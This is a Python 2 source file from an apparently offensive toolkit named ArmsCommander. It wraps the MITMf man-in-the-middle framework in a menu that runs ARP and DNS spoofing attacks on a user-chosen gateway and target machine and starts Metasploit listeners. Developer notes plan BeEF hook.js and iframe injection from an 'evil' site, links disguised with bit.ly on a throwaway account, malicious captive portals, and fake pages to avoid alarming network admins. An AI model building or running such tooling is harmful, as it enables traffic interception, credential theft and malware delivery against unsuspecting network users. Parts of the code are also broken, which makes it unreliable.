import os
import socket
import mitmf_toolkits
import sys

mitmf_dir = '/root/ArmsCommander/remoteexploits/mitmf'
os.chdir(mitmf_dir)
os.system('pwd') # to check that it properly changed directories

### DRAFT PAGE, these functions and modules have to be activated before use ###
def draft_spoofing_attacks(): # for the sake of readability, we will just divide all of this into submodules
    os.system('python ./spoofing_attacks.py')
    return

def draft_injection_attacks():
    os.system('python ./injection_attacks.py')
    return

def draft_portal_attacks():
    os.system('python ./portal_attacks.py')
    return

def draft_unique_exploits():
    os.system('python ./unique_exploits.py')
    return
def replay_last_attack():
    return
def draft_main():

    print """
        0. Return to MAIN MENU (ArmsCommander)
        1. SPOOFING attacks (DNS/ARP/ICMP, etc)
        2. INJECTION attacks (XSS, Javascript, iframes)
        3. PORTAL attacks (Captive Portal)
        4. UNIQUE EXPLOIT attacks (HTA Drive-By)
        5. REPLAY your LAST attack
    """

    opt_choice = str(raw_input("Enter an OPTION: "))

    if opt_choice == "1":
        os.system('clear')
        draft_spoofing_attacks()
        return
    elif opt_choice == "2":
        os.system('clear')
        draft_injection_attacks()
        return
    elif opt_choice == "3":
        os.system('clear')
        draft_portal_attacks()
        return
    elif opt_choice == "4":
        os.system('clear')
        draft_unique_exploits()
    elif opt_choice == "5":
        os.system('clear')
        replay_last_attack()
    elif opt_choice == "0":
        os.system('clear')
        go_back_main_menu()
        return
    else:
        draft_main()
    return
#draft_main()
### END DRAFT PAGE ###

print
"""

PROJECT PROGRESS:

COMPLETED, tested the auto-start all handlers script for metasploit to work with MITMF framework
IN PROGRESS, need to FIRST upgrade to the latest version of mitmf on GitHub and retry the same commands again
IN PROGRESS, reorganize all of the menu commands by command-type, such as
    1. SPOOFING attacks
    2. INJECTION attacks
    3. PORTAL attacks
    4. EXPLOIT attacks
IN PROGRESS, revamp the menu to include all possible attack combinations, consider using a changing variable like 'spoof_type' for spoofing attacks upon user selection so that way it can change the command string
COMPLETE, learn syntax
COMPLETED, test iframe injection and beef injection.
PARTIALLY COMPLETE, Beef Injection may or may not be working. May require a new hook.js upload
IN PROGRESS, both Beef XSS Framework and MITMF should be started at the same time, if the command for BEEF INJECTION has been made
IN PROGRESS, All of the URLS should be altered to give out a fake webpage (see set hostname below). Because the default page is the settings for the exploits, which will instantly raise alarms for a compromised network when the admin finds it
COMPLETED, the fake-portal to authentic DNS command FAILED. It appears that it is a deprecated option. Its not even in the help page
COMPLETED, FAILURE test of captive-portal html file. Did not render proper page
IN PROGRESS, The GitHub page implies that the Kali Repo copy of mitmf is deprecated https://github.com/byt3bl33d3r/MITMf/issues/70
We may need to make a installer script


"""

print
"""

# SYNTAX NOTES:
#
#                             SPOOFING ROUTER OPTIONS
#
# Sample Syntax:
#     cmd_str = 'mitmf --spoof --arp -i %s --gateway %s --target %s %s' % (
#
# It appears that the syntax for mitmf is static, and is as so:
#
# mitmf --attack-type --attack-subcategory -i interface --gateway gateway_IP --target target_IP exploit
#
# That means we can just have constantly changing variables for each slot
#
# Attack-Subcategories is for specific types of attacks, like spoofing, where categories are DNS, ARP, ICMP, etc.
# Otherwise, there is no subcategory and the string should remain empty
#
# According to the official README by bytebleeder... https://github.com/byt3bl33d3r/MITMf
#
# If you leave the target specification empty, then the exploit will tPROGRESSarget the entire subnet
#
#                             XSS AND IFRAME INJECTION OPTIONS
#
# python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com
#
# Apparently you can inject a remotely hosted IFRAME. This must be tested as a GitHub host, with a phony account made from GuerillaMail, and try Bit.ly on top of that
#
#                             COMPATIBILITY WITH BEEF framework
#
# python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js
#
#
# If you change the URL to a remotely hosted hook.js file that has been converted into a bit.ly link, that SHOULD work
#
#                             CAPTIVE PORTAL OPTIONS, taken directly from github page, there is a lot to cover
#
# Start a captive portal that redirects everything to http://SERVER/PATH:
#
# python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH
#
# Start captive portal at http://your-ip/portal.html using default page /portal.html (thx responder) and /CaptiveClient.exe (not included) from the config/captive folder:
#
# python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive
#
# Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):
#
# python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns
#
# Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 (change port in mitmf.config):
#
# python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR
#
# Same as above but with hostname:
#
# python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns
"""


mitmf_config_path = '/etc/mitmf/mitmf.conf'
msf_listener_rc_file = './mitmf_msf_listener_rc_file.rc'
ac_main_menu_path = '/root/ArmsCommander/ArmsCommander.py'
mitmf_plugin_path = '/usr/share/mitmf/plugins/'
mitmf_exploit_list = './mitmf_plugins_list'

# later on we need to make a (save state system) just like we did for Cylon-Raider. So the program will just ask the user only once, and it'll automatically input the rest
# that will be implemented in the mitmf_toolkits.py module later on
def go_back_main_menu(ac_main_menu_path):
    string = 'python %s' % ac_main_menu_path
    os.system(string)
    return

def edit_config(mitmf_config_path, msf_listener_rc_file, mitmf_exploit_list):
    print """
    #0. Return to MITMF Main Menu
    #1. Edit the MITMF configuration file (contains reverse shell information)
    #2. Edit the MENU RESOURCE FILE (contains the Metasploit Listener information)
    #INSTALL. Install the Man-In-The-Middle_Framework
    """

    opt_choice = str(raw_input("Enter a OPTION: "))

    if opt_choice == "1":
        string = 'leafpad %s' % mitmf_config_path
        os.system(string)
    elif opt_choice == "2":
        string = 'leafpad %s' % mitmf_msf_listener_rc_file
        os.system(string)
    elif opt_choice == "0":
        main()
    elif opt_choice == "INSTALL":
        os.system('apt-get update && apt-get install mitmf && mitmf')
    else:
        print 'You have entered a invalid option'
        main()
    return

def arp_spoof_attack():
    print """
    SELF NOTE: NEED TO CLARIFY THE SYNTAX FOR EXPLOIT. Which is "double-tack" or "--Exploit"
    Or make it even easier for the user, and then have it auto-set or use a dictionary file to map the number choices to a dictionary
    """
    ui_INTERFACE = str(raw_input("Enter your NETWORK INTERFACE (from ifconfig): "))
    ui_GATEWAY = str(raw_input("Enter the TARGET GATEWAY (router IP): "))
    ui_TARGET = str(raw_input("Enter the TARGET MACHINE (target IP): "))
    string = 'cat %s' % mitmf_exploit_list
    os.system(string)
    ui_EXPLOIT = str(raw_input("Enter the EXPLOIT that you want to use (see mitmf -h): "))
    cmd_str = 'mitmf --spoof --arp -i %s --gateway %s --target %s %s' % (
        ui_INTERFACE,
        ui_GATEWAY,
        ui_TARGET,
        ui_EXPLOIT
    )
    print cmd_str
    mitmf_toolkits.launch_all_listeners()
    os.system(cmd_str)
    return

def dns_spoof_attack():
    print """
    # SELF-NOTE, just collect the basic info like interface, from the main menu or make a separate function in the toolkits section to grab the basic network info so the user wont have to be asked again
    """
    ui_INTERFACE = str(raw_input("Enter your NETWORK INTERFACE (from ifconfig): "))
    ui_GATEWAY = str(raw_input("Enter the TARGET GATEWAY (router IP): "))
    ui_TARGET = str(raw_input("Enter the TARGET MACHINE (target IP): "))
    string = 'cat %s' % mitmf_exploit_list
    os.system(string)
    ui_EXPLOIT = str(raw_input("Enter the EXPLOIT that you want to use (see mitmf -h): "))
    cmd_str = 'mitmf --spoof --dns -i %s --gateway %s --target %s %s' % (
        ui_INTERFACE,
        ui_GATEWAY,
        ui_TARGET,
        ui_EXPLOIT
    )
    print cmd_str
    mitmf_toolkits.launch_all_listeners()
    os.system(cmd_str)
    return

# new idea, why not just set exploit to whatever we selected here? Just pass the variable into the function
# Also mitmf has a config file

# later on we should just reorganize the spoofing attacks by category
def main():
    print """
        #1. EDIT, edit the configuration file for Man-In-The-Middle-Framework

        # ADD LIKE A 'CONFIGURE PRESETS BUTTON, so it SAVES THE USER'S INTERFACE, GATEWAY, CHOICE OF EXPLOIT, ETC.''

        #2. ARP Spoof Attack, need to specify INTERFACE, GATEWAY, TARGET, and EXPLOIT
        #3. DNS Spoof Attack
        # SELF-NOTE: Just make Spoofing Attacks all ONE CATEGORY, because you can spoof ARP, DNS, ICMP, etc. And set a variable to alter the cmd_string

        # Everything below has not been implemented

        #4. Javascript Keylogger
        #5. Ferret-NG
        #6. App Cache Poison
        #7. HTA Drive-By Attack
        #8. FilePwn Attack
        #9. Responder
        #10. Screenshotter
        #11. Browser Sniper & Profiler
        #13. Injection-Based Attacks

        ### CUSTOM COMMANDS ###

        #14. BEEF INJECTION: Inject the javascript hook.js file from the Beef Cross-Site-Scripting Framework
        #15. CAPTIVE PORTAL: SIMPLE HTTPS SERVER
        #16. CAPTIVE PORTAL: DNS HOSTNAME
        #17. IFRAME INJECTION: If they are immune to javascript tampering
        #18.
    """

    opt_choice = str(raw_input("Enter a OPTION: "))

    if opt_choice == "0":
        go_back_main_menu(ac_main_menu_path)
    elif opt_choice == "1":
        edit_config(mitmf_config_path, msf_listener_rc_file)
    elif opt_choice == "2":
        arp_spoof_attack()
    elif opt_choice == "3":
        dns_spoof_attack()
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
